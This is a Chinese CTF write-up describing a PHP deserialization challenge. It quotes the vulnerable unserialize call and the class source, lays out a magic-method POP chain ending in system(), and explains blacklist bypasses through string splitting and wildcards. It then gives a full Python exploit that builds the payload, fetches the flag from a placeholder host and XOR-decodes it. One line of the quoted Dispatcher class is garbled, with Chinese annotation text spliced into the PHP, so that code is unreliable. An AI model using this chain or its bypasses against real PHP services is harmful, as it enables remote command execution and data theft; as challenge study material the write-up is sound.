---
title: "深空档案馆：PHP 反序列化 POP 链"
date: "2026-09-12"
categories: "Web"
tags: ["PHP", "反序列化", "POP 链"]
excerpt: "沿魔术方法串起 POP 链，绕过序列化黑名单，并还原容器中经过异或处理的结果。"
slug: "web-deep-space-archive"
source_event: "HDCTF"
---

> 复现材料：`index.php`、`classes.php`、`题目 HTTP 服务`。赛题附件未随文章打包。 本文日期取自原始题解文件的修改日期。

服务接收 base64 编码的 PHP 序列化对象，反序列化后展示字段。flag 在容器 `/flag.txt` 里，落盘前被 XOR 混淆。

## 漏洞点

页面直接给源码。`index.php` 里：

```php
$data = base64_decode($_GET['data']);
foreach ($blacklist as $bad) {
    if (stripos($data, $bad) !== false) { die('REJECTED'); }
}
$archive = unserialize($data);
```

黑名单有 `system`、`exec`、`cat`、`flag`、`$` 等字面量，挡不住 `unserialize` 本身。`classes.php` 里有一套魔术方法可以串成链：

```php
class Archive {
    public function __destruct() {
        if ($this->code === 42 && is_object($this->node)) {
            echo (string)$this->node;
        }
    }
}
class Signal {
    public function __toString() { return $this->router->send($this->token); }
}
class Dispatcher {
    public function __call($name, $args) {
        return $this->routes$name（附件名：`$args[0] ?? null`）;
    }
}
class Keypad {
    public function __invoke($in) {
        $this->pipe->{$this->slot} = $in;
        return $this->pipe->{$this->slot};
    }
}
class Pipe {
    private $key;
    public function __set($name, $value) {
        if ($name === 'key') { $this->key = $value; }
    }
    public function __get($name) {
        if ($name !== 'key') { return null; }
        if (is_object($this->out) && method_exists($this->out, 'fire')) {
            $this->out->fire($this->key);
        }
        return $this->key;
    }
}
class Terminal {
    const TOKEN = 'NOVA';
    public function fire($key) {
        if ($key !== self::TOKEN) { return; }
        $fn = $this->a . $this->b;
        call_user_func($fn, $this->cmd);
    }
}
```

构造 `Archive(code=42, node=Signal)`，脚本结束时 `__destruct` 把 node 当字符串 echo，触发：

```
Archive::__destruct → Signal::__toString → Dispatcher::__call('send')
→ Keypad::__invoke('NOVA') → Pipe::__get('key') → Terminal::fire('NOVA')
→ call_user_func('system', $cmd)
```

黑名单查的是序列化字节串里的连续子串，`system` 拆成 `a='sy'`、`b='stem'` 拼接就绕过去了。命令里读 `/flag.txt` 用 `tac /fl*.txt` 和 `base64 /fl*.txt`，避开 `cat` 和 `flag` 两个字面量。

## 解题脚本

```python
import base64, hashlib, urllib.parse, urllib.request

URL = 'https://challenge.example.invalid/?data='

def obj(cls, props):
    return f'O:{len(cls)}:"{cls}":{len(props)}:{{' + ''.join(props) + '}'

def pub(name, value):
    return f's:{len(name)}:"{name}";{value}'

def s(value):
    return f's:{len(value)}:"{value}";'

def payload(cmd):
    terminal = obj('Terminal', [pub('a', s('sy')), pub('b', s('stem')), pub('cmd', s(cmd))])
    pipe = obj('Pipe', ['s:9:"\x00Pipe\x00key";' + s('NOVA'), pub('out', terminal)])
    keypad = obj('Keypad', [pub('slot', s('key')), pub('pipe', pipe)])
    dispatcher = obj('Dispatcher', [pub('routes', 'a:1:{s:4:"send";' + keypad + '}')])
    signal = obj('Signal', [pub('router', dispatcher), pub('token', s('NOVA'))])
    archive = obj('Archive', [pub('code', 'i:42;'), pub('name', s('x')), pub('date', s('x')), pub('node', signal)])
    return base64.b64encode(archive.encode())

def run(cmd):
    with urllib.request.urlopen(URL + urllib.parse.quote(payload(cmd).decode()), timeout=30) as r:
        body = r.read()
    return body[body.rfind(b'</html>') + 7:]

cipher_b64 = run('base64 /fl*.txt').decode().strip().splitlines()[0]
cipher = base64.b64decode(cipher_b64)

# gen_flag.php 泄露的派生方式：md5('NOVA' . 'DSA-KEY') 的 hex 串做重复异或
key = hashlib.md5(b'NOVADSA-KEY').hexdigest().encode()
flag = bytes(a ^ b for a, b in zip(cipher, key * (len(cipher) // len(key) + 1)))
print(flag.decode())
```

密文 43 字节，`base64 /fl*.txt` 返回 `cHR0YnVOAwNSAVcBVVVOBlEHVkxQUFIFGQcBVwtJXAgOB1MDVgMDVFYJTg==`。key 是 `md5('NOVADSA-KEY')` 的 hex 串 `807635e1e03ec3c6c10abbb343349de1`，重复到 43 字节后逐字节异或。

## 最终结果

```text
HDCTF{f271dd6f-026f-2206-42c2-9967d5e6fe39}
```

根因就一句话：用户可控数据直接 `unserialize`，黑名单靠拼接和通配符就能绕过；flag 的 XOR 密钥是固定常量派生，还跟着 `gen_flag.php` 一起泄露了。
